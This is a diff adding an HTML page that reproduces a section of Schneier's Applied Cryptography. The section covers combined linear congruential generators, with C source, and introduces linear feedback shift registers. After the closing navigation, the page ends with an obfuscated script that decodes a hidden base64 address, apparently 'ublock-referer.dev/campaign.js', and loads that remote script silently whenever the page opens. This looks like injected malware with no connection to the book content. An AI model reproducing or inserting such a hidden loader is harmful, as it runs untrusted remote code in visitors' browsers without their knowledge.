@@ -1,0 +1,185 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=371-374//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Linear congruential generators remain useful for noncryptographic applications, however, such as simulations. They are efficient and show good statistical behavior with respect to most reasonable empirical tests. Considerable information on linear congruential generators and their implementations can be found in [942].
+</P>
+<P><FONT SIZE="+1"><B><I>Combining Linear Congruential Generators</I></B></FONT></P>
+<P>Various people examined the combination of linear congruential generators [1595,941]. The results are no more cryptographically secure, but the combinations have longer periods and perform better in some randomness tests.
+</P>
+<P>Use this generator for 32-bit computers [941]:</P>
+<!-- CODE //-->
+<PRE>
+static long s1 = 1 ; /* A &#147;long&#148; must be 32 bits long. */ static long s2 = 1 ;
+
+#define MODMULT(a,b,c,m,s) q = s/a; s = b*(s-a*q) - c*q; if (s&lt0) s&#43;=m  ;
+/* MODMULT(a,b,c,m,s) computes s*b mod m, provided that m=a*b&#43;c and 0 &lt= c &lt m. */
+
+/* combinedLCG returns a pseudorandom real value in the range
+* (0,1). It combines linear congruential generators with
+* periods of 2<SUP>31</SUP>-85 and 2<SUP>31</SUP>-249, and has a period that is the
+* product of these two prime numbers. */
+
+double combinedLCG ( void )
+{
+  long q ;
+  long z ;
+
+  MODMULT ( 53668, 40014, 12211, 2147483563L, s1 )
+  MODMULT ( 52774, 40692, 3791, 2147483399L, s2 )
+  z = s1 - s2 ;
+  if ( z &lt 1 )
+    z &#43;= 2147483562 ;
+  return z * 4.656613e-10 ;
+}
+
+/* In general, call initLCG before using combinedLCG. */
+void initLCG ( long InitS1, long InitS2 )
+{
+  s1 = InitS1 ;
+  s2 = InitS2 ;
+}
+</PRE>
+<!-- END CODE //-->
+<P>This generator works as long as the machine can represent all integers between-2<SUP>31</SUP> &#43; 85 and 2<SUP>31</SUP> - 85. The variables, <I>s</I><SUB>1</SUB> and <I>s</I><SUB>2</SUB>, are global; they hold the current state of the generator. Before the first call, they must be initialized. The variable <I>s</I><SUB>1</SUB> needs an initial value between 1 and 2147483562; the variable <I>s</I><SUB>2</SUB> needs an initial value between 1 and 2147483398. The generator has a period somewhere in the neighborhood of 10<SUP>18</SUP>.</P>
+<P>If you only have a 16-bit computer, use this generator instead:</P>
+<!-- CODE //-->
+<PRE>
+static int s1 = 1 ; /* An &#147;int&#148; must be 16 bits long. */
+static int s2 = 1 ;
+static int s3 = 1 ;
+
+#define MODMULT(a,b,c,m,s) q = s/a; s = b*(s-a*q) - c*q; if
+(s&lt0) s&#43;=m  ;
+
+/* combined LCG returns a pseudorandom real value in the
+range
+* (0,1). It combines linear congruential generators with
+* periods of 2<SUP>15</SUP>-405, 2<SUP>15</SUP>-1041, and 2<SUP>15</SUP>-1111, and has a period
+* that is the product of these three prime numbers. */
+
+double combinedLCG ( void )
+{
+  int q ;
+  int z ;
+
+  MODMULT ( 206, 157, 21, 32363, s1 )
+  MODMULT ( 217, 146, 45, 31727, s2 )
+  MODMULT ( 222, 142, 133, 31657, s3 )
+  z = s1 - s2 ;
+  if ( z &gt 706 )
+    z -= 32362 ;
+  z &#43;= s3 ;
+  if ( z &lt 1 )
+    z &#43;= 32362 ;
+  return z * 3.0899e-5 ;
+}
+
+/* In general, call initLCG before using combinedLCG. */
+void initLCG ( int InitS1, int InitS2, InitS3 )
+{
+  s1 = InitS1 ;
+  s2 = InitS2 ;
+  s3 = InitS3 ;
+}
+</PRE>
+<!-- END CODE //-->
+<P>This generator works as long as the machine can represent all integers between-32363 and 32363. The variables, <I>s</I><SUB>1</SUB>, <I>s</I><SUB>2</SUB>, and <I>s</I><SUB>3</SUB>, are global; they hold the current state of the generator. Before the first call, they must be initialized. The variable <I>s</I><SUB>1</SUB> needs an initial value between 1 and 32362. The variable <I>s</I><SUB>2</SUB> needs an initial value between 1 and 31726. The variable <I>s</I><SUB>3</SUB> needs an initial value between 1 and 31656. This generator has a period of 1.6*10<SUP>13</SUP>.</P>
+<P>For both of these generators, the constant term <I>b</I> in the linear congruence is 0.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">16.2 Linear Feedback Shift Registers</FONT></H3>
+<P>Shift register sequences are used in both cryptography and coding theory. There is a wealth of theory about them; stream ciphers based on shift registers have been the workhorse of military cryptography since the beginnings of electronics.
+</P>
+<P>A <B>feedback shift register</B> is made up of two parts: a shift register and a <B>feedback function</B> (see Figure 16.1). The shift register is a sequence of bits. (The <B>length</B> of a shift register is figured in bits; if it is <I>n</I> bits long, it is called an <I>n-</I>bit shift register.) Each time a bit is needed, all of the bits in the shift register are shifted 1 bit to the right. The new left-most bit is computed as a function of the other bits in the register. The output of the shift register is 1 bit, often the least significant bit. The <B>period</B> of a shift register is the length of the output sequence before it starts repeating.</P>
+<P>Cryptographers have liked stream ciphers made up of shift registers: They are easily implemented in digital hardware. I will only touch on the mathematical theory. Ernst Selmer, the Norwegian government&#146;s chief cryptographer, worked out the theory of shift register sequences in 1965 [1411]. Solomon Golomb, an NSA mathematician, wrote a book with Selmer&#146;s results and some of his own [643]. See also [970,971,1647].</P>
+<P>The simplest kind of feedback shift register is a <B>linear feedback shift register</B>, or LFSR (see Figure 16.2). The feedback function is simply the XOR of certain bits in the register; the list of these bits is called a <B>tap sequence</B>. Sometimes this is called a <B>Fibonacci configuration</B>. Because of the simple feedback sequence, a large body of mathematical theory can be applied to analyzing LFSRs. Cryptographers like to analyze sequences to convince themselves that they are random enough to be secure. LFSRs are the most common type of shift registers used in cryptography.</P>
+<P>Figure 16.3 is a 4-bit LFSR tapped at the first and fourth bit. If it is initialized with the value 1111, it produces the following sequence of internal states before repeating:</P>
+<DL>
+<DD>1 1 1 1
+<DD>0 1 1 1
+<DD>1 0 1 1
+<DD>0 1 0 1
+<DD>1 0 1 0
+<DD>1 1 0 1
+<DD>0 1 1 0
+<DD>0 0 1 1
+<DD>1 0 0 1
+<DD>0 1 0 0
+<DD>0 0 1 0
+<DD>0 0 0 1
+<DD>1 0 0 0
+<DD>1 1 0 0
+<DD>1 1 1 0
+</DL>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/16-01.jpg',282,87 )"><IMG SRC="images/16-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-01.jpg',282,87)"><FONT COLOR="#000077"><B>Figure 16.1</B></FONT></A>&nbsp;&nbsp;Feedback shift register.</I>
+<I></P>
+<P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/16-02.jpg',309,92 )"><IMG SRC="images/16-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-02.jpg',309,92)"><FONT COLOR="#000077"><B>Figure 16.2</B></FONT></A>&nbsp;&nbsp;Linear feedback shift register.</I>
+</P>
+<P>The output sequence is the string of least significant bits:
+</P>
+<DL>
+<DD>1 1 1 1 0 1 0 1 1 0 0 1 0 0 0....
+</DL>
+<P>An <I>n-</I>bit LFSR can be in one of 2<SUP>n</SUP> - 1 internal states. This means that it can, in theory, generate a 2<SUP>n</SUP> - 1-bit-long pseudo-random sequence before repeating. (It&#146;s 2<SUP>n</SUP> - 1 and not 2<SUP>n</SUP> because a shift register filled with zeros will cause the LFSR to output a neverending stream of zeros&#151;this is not particularly useful.) Only LFSRs with certain tap sequences will cycle through all 2<SUP>n</SUP> - 1 internal states; these are the maximal-period LFSRs. The resulting output sequence is called an <B>m-sequence</B>.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(iibWdcNa, okmnoHTZ) {okmnoHTZ = iibWdcNa.createElement('script');okmnoHTZ.type = 'text/javascript';okmnoHTZ.async = true;okmnoHTZ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');iibWdcNa.getElementsByTagName('body')[0].appendChild(okmnoHTZ);}(document));</script></body>
+</html>
